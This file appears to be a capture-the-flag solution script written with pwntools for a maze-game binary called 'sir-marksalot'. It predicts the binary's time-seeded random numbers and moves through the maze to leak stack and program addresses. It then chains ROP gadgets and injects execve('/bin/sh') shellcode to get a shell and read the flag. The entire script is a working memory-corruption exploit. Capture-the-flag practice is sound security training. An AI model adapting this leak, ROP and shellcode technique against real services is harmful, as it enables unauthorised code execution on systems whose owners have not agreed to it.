#!/usr/bin/env python3

# shellcode version

from pwn import *
from binascii import hexlify

binary = context.binary = ELF('./sir-marksalot')

def magicmarker(p,message):
	p.sendlineafter(b'): ', b'x')
	p.sendafter(b'?\n', message)

def north(p):
	magicmarker(p, 0x20 * b'\xff')
	p.sendlineafter(b'): ', b'w')

def south(p):
	magicmarker(p, 0x20 * b'\xff')
	p.sendlineafter(b'): ', b's')

def west(p):
	magicmarker(p, 0x20 * b'\xff')
	p.sendlineafter(b'): ', b'a')

def east(p):
	magicmarker(p, 0x20 * b'\xff')
	p.sendlineafter(b'): ', b'd')

while True:
	context.log_level = 'INFO'

	if args.REMOTE:
		p = remote('chals.damctf.xyz', 31314)
	else:
		p = process(binary.path)

	from ctypes import *
	glibc = cdll.LoadLibrary('libc.so.6')
	glibc.srand(glibc.time(None))

	t = time.time()

	# get started
	p.sendlineafter(b'?\n',b'jump up and down')

	# find myself (array base 1)
	p.sendlineafter(b'): ',b'm')
	x = y = 0

	for i in range(80):
		_ = p.recvline().strip()
		if b'|' in _:
			y += 1
		if b'*' in _:
			x = (2 + _.find(b'*')) // 4
			break

	# check we have a match for the seed
	dy = glibc.rand() % 0x28
	dx = glibc.rand() % 0x28
	log.info('rand {dx},{dy}'.format(dx = dx + 1, dy = dy + 1))
	if x != dx + 1 or y != dy + 1:
		log.critical('rand mismatch')
		p.close()
		continue

	gy = glibc.rand() % 0x28
	gx = glibc.rand() % 0x28
	log.info('grue at {gx},{gy}'.format(gx = gx + 1, gy = gy + 1))

	# lazy, not covering "edge" cases
	if gx == 39 or gy == 39 or gx == 0 or gy == 0:
		log.critical('grue on edge')
		time.sleep(1)
		p.close()
		continue

	# kick down the walls and get to the upper left avoiding grue
	if gx == dx:
		for i in range(x - 1): west(p)
	for j in range(y - 1): north(p)
	if gx != dx:
		for i in range(x - 1): west(p)

	log.info('time check: {s}s'.format(s = time.time() - t))

	# move west to get stack leak
	west(p)
	p.recvuntil(b'On the wall is written: ')

	leak = u64(p.recv(6) + b'\0\0')
	log.info('leak: {leak}'.format(leak = hex(leak)))
	rsp = leak - 0x20 - ((0x28 * gy) + gx) * 0x20
	log.info('rsp: {loc}'.format(loc = hex(rsp)))

	# get back to 0,0 while preserving leak
	magicmarker(p,p64(leak) + 0x18 * b'\xff')
	p.sendlineafter(b'): ', b'd')

	# get to 39,39
	for i in range(39): east(p)
	for j in range(39): south(p)

	log.info('time check: {s}s'.format(s = time.time() - t))

	# lets bust out of here, "return" to the east, via the southern border
	south(p)
	east(p)
	east(p)
	north(p)
	p.recvuntil(b'On the wall is written: ')

	leak = u64(p.recv(6) + b'\0\0')
	log.info('leak: {leak}'.format(leak = hex(leak)))
	binary.address = leak - binary.search(b'jump up and down\n').__next__()
	log.info('binary.address: {loc}'.format(loc = hex(binary.address)))

	pop_2 = binary.search(asm('pop r14; pop r15; ret')).__next__()
	pop_rbp = binary.search(asm('pop rbp; ret;')).__next__()
	jmp_ptr_rbp = binary.search(asm('jmp qword ptr [rbp];')).__next__()

	payload1  = b''
	payload1 += p64(rsp + 0x20 + (0x28 * 0x28 * 0x20) + 4 * 0x20)
	payload1 += p64(pop_2)
	payload1 += 8 * b'\xff'
	payload1 += 8 * b'\xff'
	if payload1.find(b'\n') != -1:
		log.critical('NL in payload 1')
		p.close()
		continue

	payload2  = b''
	payload2 += p64(pop_rbp)
	payload2 += p64(rsp + 0x20 + (0x28 * 0x28 * 0x20) + 2 * 0x20)
	payload2 += p64(jmp_ptr_rbp)
	payload2 += 8 * b'\xff'
	if payload1.find(b'\n') != -1:
		log.critical('NL in payload 1')
		p.close()
		continue

	payload3  = b''
	payload3 += asm(f'''
	mov rax, {'0x' + hexlify(b'/bin/sh'[::-1]).decode()}
	push rax
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov eax, {constants.SYS_execve}
	syscall
	''')
	payload3 += (0x20 - len(payload3)) * b'\xff'
	if payload2.find(b'\n') != -1:
		log.critical('NL in payload 2')
		p.close()
		continue

	east(p)

	magicmarker(p, payload1)
	p.sendlineafter(b'): ', b'd')
	magicmarker(p, payload2)
	p.sendlineafter(b'): ', b'd')
	magicmarker(p, payload3)
	p.sendlineafter(b'): ', b'a')

	p.sendlineafter(b'): ', b'a')
	p.sendlineafter(b'): ', b'a')
	p.sendlineafter(b'): ', b's')
	p.sendlineafter(b'): ', b'a')
	p.sendlineafter(b'): ', b'a')
	p.sendlineafter(b'): ', b'w')

	log.info('time check: {s}s'.format(s = time.time() - t))

	# kick down walls to the grue
	for i in range(39 - gx): west(p)
	for j in range(39 - gy): north(p)

	p.recvuntil(b'Grue.\n')
	log.info('time check: {s}s'.format(s = time.time() - t))
	log.info('grue!')
	break

#p.interactive()
p.sendline(b'cat flag')
print(p.recvline().strip().decode())
